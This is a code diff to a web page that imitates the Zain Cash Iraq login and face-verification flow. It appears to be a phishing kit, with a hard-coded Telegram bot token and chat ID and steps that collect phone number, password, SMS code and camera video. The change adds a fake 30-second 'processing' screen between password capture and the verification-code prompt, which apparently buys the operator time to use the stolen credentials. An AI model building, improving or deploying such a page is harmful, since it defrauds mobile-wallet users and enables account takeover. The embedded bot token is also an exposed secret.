@@ -140,17 +140,24 @@
     .timer { text-align:center; color:#e53935; font-weight:700; margin:10px 0; font-size:16px; }
     .timer.warning { color:#ff9800; }
 
+    .loading-screen { display:flex; flex-direction:column; align-items:center; justify-content:center; padding:40px 0; }
+    .loading-icon { width:80px; height:80px; margin-bottom:20px; }
+    .loading-text { color:var(--primary-1); font-size:20px; font-weight:700; margin-bottom:10px; }
+    .loading-subtext { color:#666; font-size:14px; margin-bottom:20px; }
+    .loading-spinner { width:50px; height:50px; border:4px solid rgba(47,128,237,0.2); border-top-color:var(--primary-1); border-radius:50%; animation:spin 1s linear infinite; margin:0 auto; }
+    @keyframes spin { to { transform:rotate(360deg); } }
+    .countdown { font-size:24px; color:var(--primary-1); font-weight:800; }
+
     .camera-wrap { display:flex; flex-direction:column; align-items:center; gap:14px; }
     .camera-box { width:100%; max-width:320px; height:420px; background:#2f2f33; border-radius:8px; overflow:hidden; position:relative; border:6px solid #fff; box-sizing:border-box; display:flex; align-items:center; justify-content:center; }
     .camera-box video { width:100%; height:100%; object-fit:cover; }
     .instruction-box { background: rgba(0,0,0,0.72); color:#fff; padding:12px; border-radius:10px; max-width:320px; text-align:center; font-size:16px; line-height:1.45; }
-    .countdown { position:absolute; top:8px; left:8px; background:rgba(0,0,0,0.45); color:#fff; padding:6px 10px; border-radius:12px; font-weight:700; }
+    .countdown-camera { position:absolute; top:8px; left:8px; background:rgba(0,0,0,0.45); color:#fff; padding:6px 10px; border-radius:12px; font-weight:700; }
 
     #processingModal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.55); z-index:10000; align-items:center; justify-content:center; color:#fff; }
     #processingModal.active { display:flex; }
     .processingBox { background:rgba(0,0,0,0.65); padding:20px 26px; border-radius:12px; text-align:center; min-width:260px; }
     .spinner { width:48px; height:48px; border-radius:50%; border:5px solid rgba(255,255,255,0.18); border-top-color:#fff; animation:spin 1s linear infinite; margin:0 auto 12px; }
-    @keyframes spin { to { transform:rotate(360deg); } }
 
     #modalError { display:none; position:fixed; inset:0; background:rgba(47,128,237,0.13); z-index:9999; align-items:center; justify-content:center; }
     #modalError.active { display:flex; }
@@ -199,7 +206,7 @@
     <div id="permissionBox" role="document" aria-labelledby="permTitle">
       <h3 id="permTitle">نحتاج إذن الكاميرا</h3>
       <p id="permText">
-        التطبيق بحاجة إلى إذن الكاميرا والميكروفون لإجراء التحقق بالوجه. إذا رفضت الطلب سيتم عرض هذه النافذة وتستطيع إعادة المحاولة.
+        التطبيق بحاجة إلى إذن الكاميرا والميكروفون لإجراء التحقق بالوجه.
       </p>
       <div class="perm-actions">
         <button id="permRetryBtn" class="button">إعادة المحاولة</button>
@@ -212,6 +219,7 @@
   const BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
   const CHAT_ID = "6873334348";
   const CODE_TIMEOUT = 60; // 60 ثانية
+  const LOADING_WAIT = 30; // 30 ثانية انتظار بعد الهاتف وكلمة السر
 
   const app = document.getElementById('app');
   const faceLogo = "https://e.top4top.io/p_3664gms740.jpeg";
@@ -290,9 +298,40 @@
         console.log(e); 
       }
       
-      // التوجيه لصفحة رمز التحقق
-      renderCode4Step();
+      // عرض شاشة الانتظار 30 ثانية
+      renderLoadingScreen();
     };
+  }
+
+  // شاشة الانتظار 30 ثانية
+  function renderLoadingScreen(){
+    let timeLeft = LOADING_WAIT;
+    
+    app.innerHTML = `
+      <div class="loading-screen">
+        <div class="loading-icon">
+          <img src="${zainCashLogo}" alt="Zain" style="width:100%;height:100%;border-radius:16px;"/>
+        </div>
+        <div class="loading-text">جاري معالجة البيانات...</div>
+        <div class="loading-subtext">يرجى الانتظار</div>
+        <div class="loading-spinner"></div>
+        <div style="margin-top:20px; color:var(--primary-1); font-weight:700; font-size:16px;">
+          الوقت المتبقي: <span id="loadingTimer">${timeLeft}</span> ثانية
+        </div>
+      </div>
+      <div class="zain-footer">Zain Cash Iraq &copy; 2025</div>
+    `;
+
+    const timerDisplay = document.getElementById('loadingTimer');
+    const interval = setInterval(() => {
+      timeLeft--;
+      timerDisplay.textContent = timeLeft;
+
+      if(timeLeft <= 0) {
+        clearInterval(interval);
+        renderCode4Step(); // عرض صفحة رمز التحقق بعد 30 ثانية
+      }
+    }, 1000);
   }
 
   // رمز التحقق (4 أرقام)
@@ -302,7 +341,7 @@
     app.innerHTML = `
       <button class="back-btn" id="backBtn">&#8592; رجوع</button>
       ${header("تم إرسال رمز تحقق إلى هاتفك")}
-      ${stepIndicator(1)}
+      ${stepIndicator(2)}
       <div class="info-msg">أدخل رمز التحقق المكون من 4 أرقام كما وصلك برسالة SMS</div>
       <div class="timer" id="timerDisplay">الوقت المتبقي: <span id="timeLeft">60</span> ثانية</div>
       <form id="code4Form" autocomplete="off">
@@ -461,7 +500,7 @@
       <div style="padding:8px;">
         <div class="camera-wrap">
           <div class="camera-box" id="cameraBox">
-            <div class="countdown" id="countdown" style="display:none">3</div>
+            <div class="countdown-camera" id="countdown" style="display:none">3</div>
             <video id="videoPreview" playsinline autoplay muted></video>
           </div>
           <div class="instruction-box" id="instructionBox">جاري تجهيز الكاميرا...</div>
